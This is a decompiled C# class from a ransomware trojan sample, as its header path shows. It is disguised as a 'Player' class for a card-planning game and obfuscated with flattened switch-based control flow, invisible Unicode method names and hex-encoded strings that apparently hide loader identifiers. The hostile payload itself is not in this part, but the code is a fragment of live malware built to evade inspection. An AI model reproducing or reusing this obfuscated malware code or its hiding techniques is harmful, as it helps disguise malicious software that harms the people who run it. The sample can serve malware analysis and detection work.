// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: ClaimTyp, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 6CD146E8-0143-4099-A2FD-F452B55D5FF5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-200a5cb8bf6489144c66e3b85eaeec5327dc66321001f4c0fda42840d0f230ec.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = -915304196;
      bool flag1;
      bool flag2;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -943888958)) % 14U)
        {
          case 0:
            int num3 = flag2 ? -12046887 : (num3 = -793119779);
            num1 = num3 ^ (int) num2 * -513999063;
            continue;
          case 1:
            num1 = (int) num2 * -755457786 ^ 55645340;
            continue;
          case 2:
            num1 = (int) num2 * -652504639 ^ 983745657;
            continue;
          case 3:
            num1 = (int) num2 * 788384292 ^ -582489070;
            continue;
          case 4:
            str1 = "50305A4852597452";
            num1 = (int) num2 * 197196916 ^ -871551984;
            continue;
          case 6:
            str1 = "546872656164506F6F6C5461736B5363686564756C";
            num1 = (int) num2 * -2058941136 ^ -881285940;
            continue;
          case 7:
            num1 = (int) num2 * 518676603 ^ -2034419558;
            continue;
          case 8:
            str1 = (string) null;
            flag2 = BaseStream == 0;
            num1 = (int) num2 * 2037056926 ^ 611266872;
            continue;
          case 9:
            int num4 = flag1 ? 1607112121 : (num4 = 1262494309);
            num1 = num4 ^ (int) num2 * -835421210;
            continue;
          case 10:
            num1 = (int) num2 * 181581427 ^ 1529374683;
            continue;
          case 11:
            flag1 = BaseStream == 1;
            num1 = -1641425481;
            continue;
          case 12:
            goto label_1;
          case 13:
            str2 = str1;
            num1 = -130184619;
            continue;
          default:
            goto label_15;
        }
      }
label_15:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = -789613790;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1114532889)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 3:
            num1 = (int) num2 * 1984049709 ^ 1543114450;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      int num3 = 0;
      goto label_5;
label_7:
      int num4;
      return num4;
label_4:
      num3 = this.PlanningCards[cardTypeIndex];
label_5:
      num4 = num3;
      num1 = -31705768;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = 1637863100;
        int num2;
        int num3;
        int planningCardsCount;
        int index;
        int[] planningCards;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num1 ^ 1196500542)) % 13U)
          {
            case 0:
              num2 = planningCards[index];
              num1 = 1437978972;
              continue;
            case 1:
              num3 = 0;
              num1 = (int) num4 * -1793422444 ^ 2069991181;
              continue;
            case 2:
              ++num3;
              num1 = (int) num4 * 601646530 ^ 832409138;
              continue;
            case 3:
              int num5;
              num1 = num5 = index < planningCards.Length ? 1133953675 : (num5 = 897949433);
              continue;
            case 4:
              num1 = (int) num4 * -587935059 ^ -1002849989;
              continue;
            case 5:
              planningCardsCount = num3;
              num1 = (int) num4 * -299698151 ^ -1954896093;
              continue;
            case 7:
              int num6 = num2 > 0 ? -775022498 : (num6 = -1566548924);
              num1 = num6 ^ (int) num4 * 813907161;
              continue;
            case 8:
              goto label_1;
            case 9:
              num1 = (int) num4 * 1849013537 ^ -1214859648;
              continue;
            case 10:
              index = 0;
              num1 = (int) num4 * 225013633 ^ -1651690760;
              continue;
            case 11:
              ++index;
              num1 = 1456596016;
              continue;
            case 12:
              planningCards = this.PlanningCards;
              num1 = (int) num4 * -1555047625 ^ -1273818846;
              continue;
            default:
              goto label_14;
          }
        }
label_14:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = 882631554;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 267536531)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 592823968 ^ -1547935262;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = -1528797001;
      int index;
      int planningCard;
      string str1;
      string str2;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -785670849)) % 15U)
        {
          case 0:
            index = 0;
            num1 = (int) num2 * -1570346000 ^ -1795650104;
            continue;
          case 1:
            int num3;
            num1 = num3 = index < this.PlanningCards.Length ? -867832252 : (num3 = -1103313617);
            continue;
          case 2:
            num1 = -1762937006;
            continue;
          case 3:
            num1 = (int) num2 * 31066040 ^ 532481536;
            continue;
          case 4:
            int num4 = !flag ? -57276919 : (num4 = -744655728);
            num1 = num4 ^ (int) num2 * 182903781;
            continue;
          case 5:
            flag = planningCard == 0;
            num1 = (int) num2 * -274749201 ^ -1555707848;
            continue;
          case 6:
            num1 = (int) num2 * 768552718 ^ -105175900;
            continue;
          case 7:
            goto label_1;
          case 8:
            ++index;
            num1 = -1721560718;
            continue;
          case 9:
            planningCard = this.PlanningCards[index];
            num1 = (int) num2 * -1936051551 ^ 1298552766;
            continue;
          case 11:
            str1 = " ";
            num1 = (int) num2 * -1362775840 ^ 339722839;
            continue;
          case 12:
            str1 = Player.\u202C‫‎‎‪⁮⁭‫‬​⁫‍‌‏⁪⁪⁯‭‍‎‮‬⁪⁬⁭‬‫⁬‮‫⁯⁬‍‌‫​⁬‪‭‭‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -709670908;
            continue;
          case 13:
            str2 = str1;
            num1 = (int) num2 * -888858657 ^ -2045123166;
            continue;
          case 14:
            num1 = (int) num2 * 1856108816 ^ 380847874;
            continue;
          default:
            goto label_16;
        }
      }
label_16:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = 1489212512;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2093330510)) % 4U)
        {
          case 1:
            num1 = (int) num2 * 994181171 ^ -1873537299;
            continue;
          case 2:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * 1512858052 ^ 1437784331;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = 1798115568;
      int aIndex;
      int count;
      bool flag;
      int[] numArray;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 437873083)) % 10U)
        {
          case 0:
            ++aIndex;
            num1 = (int) num2 * -1589438765 ^ -1040068686;
            continue;
          case 1:
            count = json.Count;
            num1 = (int) num2 * 663702631 ^ 77227278;
            continue;
          case 2:
            num1 = (int) num2 * -1395595148 ^ -2112628739;
            continue;
          case 3:
            planningCards = numArray;
            num1 = (int) num2 * -118678080 ^ -126435567;
            continue;
          case 5:
            int num3 = flag ? -1767751626 : (num3 = -1918058797);
            num1 = num3 ^ (int) num2 * 1703098825;
            continue;
          case 6:
            numArray = new int[count];
            aIndex = 0;
            num1 = (int) num2 * -874139206 ^ -182155954;
            continue;
          case 7:
            goto label_1;
          case 8:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = 2071251583;
            continue;
          case 9:
            flag = aIndex < count;
            num1 = 577821880;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = -1674755662;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1507280688)) % 4U)
        {
          case 1:
            num1 = (int) num2 * -12911117 ^ -1570222573;
            continue;
          case 2:
            str = Player.\u200E‍⁮‮‪‪‎​‫‮‌‫​‮‌⁮⁭‪​⁬⁭⁯‮⁪⁬⁬‭⁯‏‮‭⁪‮⁭​⁬‏‮⁬‍‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * 401785040 ^ -413531395;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u202C‫‎‎‪⁮⁭‫‬​⁫‍‌‏⁪⁪⁯‭‍‎‮‬⁪⁬⁭‬‫⁬‮‫⁯⁬‍‌‫​⁬‪‭‭‮([In] string[] obj0) => string.Concat(obj0);

    static string \u200E‍⁮‮‪‪‎​‫‮‌‫​‮‌⁮⁭‪​⁬⁭⁯‮⁪⁬⁬‭⁯‏‮‭⁪‮⁭​⁬‏‮⁬‍‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
